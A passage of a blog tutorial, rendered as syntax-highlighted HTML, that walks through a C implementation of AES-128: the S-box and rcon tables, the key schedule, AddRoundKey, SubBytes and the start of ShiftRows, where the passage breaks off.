class="mh">0xEE</span><span class="p">,</span> <span class="mh">0xB8</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0xE0</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xAC</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0xC8</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x6D</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0xD5</span><span class="p">,</span> <span class="mh">0x4E</span><span class="p">,</span> <span class="mh">0xA9</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xF4</span><span class="p">,</span> <span class="mh">0xEA</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span> <span class="mh">0xAE</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xBA</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0xB4</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x1F</span><span class="p">,</span> <span class="mh">0x4B</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x8A</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x3E</span><span class="p">,</span> <span class="mh">0xB5</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xF6</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x9E</span><span class="p">,</span> <span class="mh">0xE1</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xD9</span><span class="p">,</span> <span class="mh">0x8E</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x9B</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0xCE</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0xDF</span><span class="p">,</span> <span class="mh">0x8C</span><span class="p">,</span> <span class="mh">0xA1</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x0D</span><span class="p">,</span> <span class="mh">0xBF</span><span class="p">,</span> <span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x2D</span><span class="p">,</span> <span class="mh">0x0F</span><span class="p">,</span> <span class="mh">0xB0</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0x16</span> <span class="p">};</span>
</span><span class='line'><span class="cp">#define DW(x) (*(unsigned int*)(x))</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">d</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">round_keys</span><span class="p">[</span><span class="mi">11</span><span class="p">][</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span><span class='line'>    <span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">rcon</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xAB</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x9A</span><span class="p">,</span> <span class="mh">0x2F</span><span class="p">,</span> <span class="mh">0x5E</span><span class="p">,</span> <span class="mh">0xBC</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xC6</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x6A</span><span class="p">,</span> <span class="mh">0xD4</span><span class="p">,</span> <span class="mh">0xB3</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0xFA</span><span class="p">,</span> <span class="mh">0xEF</span><span class="p">,</span> <span class="mh">0xC5</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0xD3</span><span class="p">,</span> <span class="mh">0xBD</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x4A</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xCC</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x1D</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xE8</span><span class="p">,</span> <span class="mh">0xCB</span><span class="p">,</span> <span class="mh">0x8D</span> <span class="p">};</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Key schedule -- Generate one subkey for each round</span>
</span><span class='line'>    <span class="c1">/// http://www.formaestudio.com/rijndaelinspector/archivos/Rijndael_Animation_v4_eng.swf</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// First round-key is the actual key</span>
</span><span class='line'>    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">round_keys</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="n">key</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
</span><span class='line'>    <span class="n">d</span> <span class="o">=</span> <span class="n">DW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">round_keys</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">12</span><span class="p">]);</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">11</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="c1">// Rotate `d` 8 bits to the right</span>
</span><span class='line'>        <span class="n">d</span> <span class="o">=</span> <span class="n">ROT</span><span class="p">(</span><span class="n">d</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// Takes every bytes of `d` &amp; substitute them using `S_box`</span>
</span><span class='line'>        <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a2</span><span class="p">,</span> <span class="n">a3</span><span class="p">,</span> <span class="n">a4</span><span class="p">;</span>
</span><span class='line'>        <span class="c1">// Do not forget to xor this byte with `rcon[i]`</span>
</span><span class='line'>        <span class="n">a1</span> <span class="o">=</span> <span class="n">S_box</span><span class="p">[(</span><span class="n">d</span> <span class="o">&gt;&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">]</span> <span class="o">^</span> <span class="n">rcon</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="c1">// a1 is the LSB</span>
</span><span class='line'>        <span class="n">a2</span> <span class="o">=</span> <span class="n">S_box</span><span class="p">[(</span><span class="n">d</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">];</span>
</span><span class='line'>        <span class="n">a3</span> <span class="o">=</span> <span class="n">S_box</span><span class="p">[(</span><span class="n">d</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">];</span>
</span><span class='line'>        <span class="n">a4</span> <span class="o">=</span> <span class="n">S_box</span><span class="p">[(</span><span class="n">d</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">d</span> <span class="o">=</span> <span class="p">(</span><span class="n">a1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">a2</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">a3</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">a4</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// Now we can generate the current roundkey using the previous one</span>
</span><span class='line'>        <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>        <span class="p">{</span>
</span><span class='line'>            <span class="n">d</span> <span class="o">^=</span> <span class="n">DW</span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">][</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span><span class="p">]));</span>
</span><span class='line'>            <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">round_keys</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span> <span class="o">*</span> <span class="mi">4</span><span class="p">]))</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Sweet, feel free to dump the round keys and to compare them with an official test vector to convince you that this thing works. Once we have that function, we need to build the different primitives that the core encryption algorithm will use &amp; reuse to generate the encrypted block. Some of them are like 1 line of C, really simple ; some others are a bit more twisted, but whatever.</p>

<h2>Encryption process</h2>

<h3>Transformations</h3>

<h4>AddRoundKey</h4>

<p>This one is a really simple one: it takes a round key (according to which round you are currently in), the state &amp; you xor every single byte of the state with the round-key.</p>

<figure class='code'><figcaption><span>AddRoundKey</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">AddRoundKey</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">roundkey</span><span class="p">[</span><span class="mi">16</span><span class="p">],</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">16</span><span class="p">])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>        <span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">roundkey</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>SubBytes</h4>

<p>Another simple one: it takes the state as input &amp; will substitute every byte using the forward substitution box <code>S_box</code>.</p>

<figure class='code'><figcaption><span>SubBytes</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">SubBytes</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">16</span><span class="p">])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>        <span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">S_box</span><span class="p">[</span><span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]];</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>If you are interested in how the values of the <code>S_box</code> are computed, you should read the following blogpost <a href="http://kutioo.blogspot.fr/2013/11/aes-sbox-and-parigp.html">AES SBox and ParisGP</a> written by my mate <a href="https://twitter.com/kutioo">@kutioo</a>.</p>

<h4>ShiftRows</h4>

<p>This operation is a bit less tricky, but still is fairly straightforward. Imagine that the state is a 4x4 matrix, you just have to left rotate the second line by 1 byte, the third one by 2 bytes &amp; finally the last one by 3 bytes. This can be done in C like this:</p>

<figure class='code'><figcaption><span>ShiftRows</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">__forceinline</span> <span class="kt">void</span> <span class="nf">ShiftRows</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">16</span><span class="p">])</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="c1">// +----+----+----+----+</span>
</span><span class='line'>    <span class="c1">// | 00 | 04 | 08 | 12 |</span>
</span><span class='line'>    <span class="c1">// +----+----+----+----+</span>
</span><span class='line'>    <span class="c1">// | 01 | 05 | 09 | 13 |</span>
</span><span class='line'>    <span class="c1">// +----+----+----+----+</span>
</span><span class='line'>    <span class="c1">// | 02 | 06 | 10 | 14 |</span>
</span><span class='line'>    <span class="c1">// +----+----+----+----+</span>
</span><span class='line'>    <span class="c1">// | 03 | 07 | 11 | 15 |</span>
</span><span class='line'>    <span class="c1">// +----+----+----+----+</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">tmp1</span><span class="p">,</span> <span class="n">tmp2</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">tmp1</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>    <span class="n">out</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
</span><span class='line'>    <span class="n">out</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">9</span><span class="p">];</span>
</span><span class='line'>    <span class="n">out</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">13</span><span class="p">];</span>
</span><span class='line'>    <span class="n">out</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">tmp1</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span><span class='line'>    <span class="n">tmp2</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
</span><span class='line'>    <span class="n">out</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
</span><span class='line'>    <span class="n">out</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">14</span><span class="p">];</span>
</span><span class='line'>    <span class="n">out</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp1</span><span class="p">;</span>
</span><span class='line'>    <span class="n">out</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp2</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">tmp1</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span><span class='line'>    <span class="n">out</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">15</span><span class="p">];</span>
</span><span class='line'>    <span class="n">out</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">11</span><span class="p">];</span>
